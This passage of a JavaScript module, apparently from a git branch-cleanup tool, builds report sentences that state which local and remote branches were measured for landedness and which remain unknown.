const COVERAGE_LIST_CAP = 8;
function nameList(names) {
  const shown = names.slice(0, COVERAGE_LIST_CAP).join(", ");
  return names.length > COVERAGE_LIST_CAP
    ? `${shown} (+${names.length - COVERAGE_LIST_CAP} more)`
    : shown;
}

/**
 * PURE. One line per GAP in the measurement; an empty array means both halves
 * measured everything they were asked to. A non-empty result is a finding in its
 * own right: silence from a partial pass is byte-identical to "nothing reapable".
 *
 * `local`  — `{status:"measured", base, budgetMs, examined, unexamined, unmeasured, candidates}`
 *            or `{status:"undetermined", reason}`.
 * `remote` — `wip-lanes.js::landedRemoteRefs`' return (`{ok:false}` when unanswerable).
 */
function coverageLines({ local, remote } = {}) {
  const lines = [];
  if (!local || local.status !== "measured") {
    lines.push(
      `LOCAL half NOT RUN — no local branch was measured, because the trunk could not be resolved: ${local && local.reason ? local.reason : "no reason was recorded"}. Local landedness is UNKNOWN, not "nothing reapable".`,
    );
  } else {
    if (local.unexamined.length > 0) {
      lines.push(
        `LOCAL half INCOMPLETE — the ${local.budgetMs}ms budget ran out after ${local.examined.length} of ${local.candidates} local branch(es) were measured against \`${local.base}\`. NOT examined: ${nameList(local.unexamined)}. Their landedness is UNKNOWN, not "not landed" — measure each with \`git cherry ${local.base} <branch>\` (no \`+\` line ⇒ landed).`,
      );
    }
    // Provenance-UNKNOWN branches are in `unmeasured` too (so `complete` and
    // every existing reader treat them as unmeasured), but the REASON differs:
    // no git error occurred — the recorded provenance could not answer and the
    // content comparison was deliberately NOT run. Each gets its own sentence
    // so neither reason is misattributed to the other.
    const provUnknown = Array.isArray(local.provenanceUnknown) ? local.provenanceUnknown : [];
    const provNames = new Set(provUnknown.map((p) => p.branch));
    const gitUnmeasured = local.unmeasured.filter((b) => !provNames.has(b));
    if (gitUnmeasured.length > 0) {
      lines.push(
        `LOCAL half INCOMPLETE — ${gitUnmeasured.length} local branch(es) could not be measured against \`${local.base}\` (git errored, timed out, or printed unparseable output): ${nameList(gitUnmeasured)}. Their landedness is UNKNOWN.`,
      );
    }
    if (provUnknown.length > 0) {
      lines.push(
        `LOCAL half INCOMPLETE — ${provUnknown.length} local branch(es) could not be decided by LANDING PROVENANCE against \`${local.base}\` and were NOT content-compared (a content match is not evidence of landing once recording is on): ${nameList(provUnknown.map((p) => `${p.branch} (${p.why})`))}. They are UNMEASURED — never reapable on this pass.`,
      );
    }
  }
  if (!remote || remote.ok !== true) {
    lines.push(
      "REMOTE-only half NOT RUN — the remote-ref scan could not answer (no origin, an unresolvable base, or git failed). Remote-only landed refs are UNKNOWN.",
    );
  } else if (remote.truncated) {
    const missed = [...(remote.unexamined || []), ...(remote.unmeasured || [])];
    lines.push(
      `REMOTE-only half is a LOWER bound against \`${remote.base}\` — examined ${remote.examined} of ${remote.candidates} remote ref(s)` +
        (missed.length ? `; NOT measured: ${nameList(missed)}` : "") +
        `. A ref not measured is UNKNOWN, not "not landed" — \`node .claude/bin/remote-ref-reap.mjs\` measures every remote ref.`,
    );
  }
  return lines;
}

/** PURE. Names the ACTUAL base of each half — they are resolved independently. */
function basesSentence({ localBase, remoteBase, instruments = null } = {}) {
  const half = (label, base) =>
    base ? `${label} against \`${base}\`` : `${label}: NOT measured`;
  // `instruments` present ⇒ the local half ran provenance-first
  // (`measureLocalByProvenance`), and the sentence says how many branches each
  // instrument decided. Absent ⇒ the legacy all-content sentence, unchanged.
  if (instruments && Number.isInteger(instruments.provenance) && Number.isInteger(instruments.content)) {
    const localPart = localBase
      ? `local branches against \`${localBase}\` — ${instruments.provenance} decided by LANDING PROVENANCE (the Landed-From / Landed-Partial trailers recorded at landing; no content comparison), ${instruments.content} by CONTENT (patch-id, \`git cherry\`) because recorded provenance could not speak for them (history before the cutover, a branch with no commits of its own, or a repository with no recording config); a branch whose landing map could not be built is UNMEASURED, never content-compared`
      : "local branches: NOT measured";
    return (
      `Reapability was decided by recorded provenance first and by content only where provenance could not speak — never by branch name and never by a delete primitive's own opinion — ` +
      `${localPart}; ${half("remote-only refs", remoteBase)} (by CONTENT, patch-id).`
    );
  }
  return (
    `Reapability was decided by CONTENT (patch-id), never by branch name and never by a delete primitive's own opinion — ` +
    `${half("local branches", localBase)}; ${half("remote-only refs", remoteBase)}.`
  );
}

module.exports = {
  NEVER_REAP,
  PROTECTED_PREFIXES,
  isProtectedName,
  isCommandSafeRefName,
  displayUnsafeRefName,
  parseBranchList,
  isLandedByContent,
  parseRemoteRefs,
  classify,
  reapCommands,
  summarize,
  branchNameOfRef,
  parseDefaultBranch,
  parseWorktreeBranches,
  measureLocalByContent,
  measureLocalByProvenance,
  resolveLocalBudget,
  coverageLines,
  basesSentence,
};
